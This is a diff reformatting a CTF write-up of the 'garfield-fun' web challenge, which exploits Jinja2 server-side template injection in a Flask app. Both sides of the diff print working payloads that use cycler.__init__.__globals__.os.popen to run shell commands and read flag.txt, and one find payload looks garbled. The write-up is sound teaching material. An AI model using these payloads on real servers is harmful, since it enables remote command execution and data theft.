@@ -1,36 +1,30 @@
----
-title: Garfield Fun – Server Side Template Injection (SSTI) Exploitation
-description: Garfield Fun SSTI walkthrough
-categories: [Web, USC CTF]
-tags: [ssti, flask, jinja2]
-toc: true
-media_subpath: /assets/img/posts/garfield-ssti/
----
+### Garfield Fun – Server Side Template Injection (SSTI) Exploitation
+ **CTF:** USC CTF  
+ **Challenge:** garfield-fun  
+ **Category:** Web  
+ **Points:** 100 
 
 ### Description:
  what is server side template injection? can you use it to get garfields secret?
  
  garfield-fun.challenge.uscctf.org 
  
- **Challenge:** garfield-fun  
- **Points:** 100 
- 
  Downloads: app.py
 
-### SSTI
+### Below is the simplified version of SSTI
   
-  Server-Side Template Injection (SSTI) is a vulnerability that happens when a website takes user input and directly uses it inside a template without treating it as plain text. 
-  
-  Templates are used by web applications to generate HTML pages. 
-  Some common template engines are Jinja2 (Python/Flask), Twig (PHP),etc. 
-  These engines can evaluate expressions written inside special syntax like {{ ... }}.
-  
-  If user input is inserted into the template and then rendered, the server may execute that input as code instead of displaying it.
-  for example: {{ 7*7 }} is added to the url, Instead of showing "{{7*7}}" as text, the server evaluates it and returns: 49
-  
-  This confirms that the input is being executed on the server, which means Server Side Template Injection exists.
+    Server-Side Template Injection (SSTI) is a vulnerability that happens when a website takes user input and directly uses it inside a template without treating it as plain text. 
+    
+    Templates are used by web applications to generate HTML pages. 
+    Some common template engines are Jinja2 (Python/Flask), Twig (PHP),etc. 
+    These engines can evaluate expressions written inside special syntax like {{ ... }}.
+    
+    If user input is inserted into the template and then rendered, the server may execute that input as code instead of displaying it.
+    for example: {{ 7*7 }} is added to the url, Instead of showing "{{7*7}}" as text, the server evaluates it and returns: 49
+    
+    This confirms that the input is being executed on the server, which means Server Side Template Injection exists.
 
-### Initial Approach
+   ### Initial Approach
 
    I started by [reading](https://medium.com/@Fcmam5/ctf-as-a-developer-pt-1-template-engines-ssti-b03c59e2c095) about Server-Side Template Injection (SSTI) 
    
@@ -86,60 +80,55 @@ media_subpath: /assets/img/posts/garfield-ssti/
 
  I noticed that user input (word_1 to word_16) is inserted into a template using .format() and then rendered using                       render_template_string(). This made me suspect **SSTI**.
 
-### Confirming SSTI
+ ### Confirming SSTI
  [The challenege website](https://garfield-fun.challenge.uscctf.org)
+ ![Garfield Fun](../assets/Garfield_1.png)
+
+    Payload:/mylabs?word_5={{7*7}}
+ ![SSTI_Confirmed](../assets/Garfield_1.png)
  
- ![Garfield Fun](Garfield_00.png)
+    Output: Observe the 49 in the image above.
+    This confirms that SSTI exists.
+
+ ---
+ ### Exploring the Environment
+    Payload:/mylabs?word_5={{config}}
+ ![Config output](../assets/Garfield_2.png)
  
- ![Garfield Fun1](Garfield_01.png)
-  
-    Payload:{% raw %}/mylabs?word_5={{7*7}}{% endraw %}
-
- ![SSTI_Confirmed](Garfield_1.png)
-   
-     Output:{% raw %}Observe the 49 in the image above.{% endraw %}
-  
-  This confirms that SSTI exists.
-
- ---
-### Exploring the Environment
-    Payload:{% raw %}/mylabs?word_5={{config}}{% endraw %}
- 
- ![Config output](Garfield_2.png)
- 
-  This showed the Flask config object, but SECRET_KEY was None, so it was not useful.
+    This showed the Flask config object, but SECRET_KEY was None, so it was not useful.
 
  ---
 
-### Listing Files
-    Payload:{% raw %}/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}{% endraw %}
+ ### Listing Files
 
- ![ls output](Garfield_3.png)
-
- ---
-
-### Searching for the Flag
-    Payload:{% raw %}/mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}{% endraw %}
-
- ![find output](Garfield_4.png)
-
-  This revealed the presence of flag.txt.
+    Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
+ ![ls output](../assets/Garfield_3.png)
 
  ---
 
-### Reading the Flag
-     Payload:{% raw %}/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}{% endraw %}
+ ### Searching for the Flag
 
- ![flag output](Garfield_5.png)
+    Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}
+
+ ![find output](../assets/Garfield_4.png)
+
+    This revealed the presence of flag.txt.
 
  ---
 
-### Flag
-    {% raw %}uscctf{ssti_rules_mwahaha}{% endraw %}
- 
+ ### Reading the Flag
+    Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
+ ![flag output](../assets/Garfield_5.png)
+
  ---
 
-### Why SSTI is Dangerous
+ ### Flag
+
+    uscctf{ssti_rules_mwahaha}
+
+ ---
+
+ ### Why SSTI is Dangerous
 
     SSTI can allow attackers to:
     
@@ -152,7 +141,7 @@ media_subpath: /assets/img/posts/garfield-ssti/
     
  ---
 
-### Root Cause
+ ### Root Cause
 
     The vulnerability exists because:
     
@@ -164,6 +153,6 @@ media_subpath: /assets/img/posts/garfield-ssti/
     
  ---
 
-### Final Thought
+ ### Final Thought
 
 This challenge shows how dangerous it is to render user-controlled input inside templates. Even a small mistake can lead to full server compromise.  
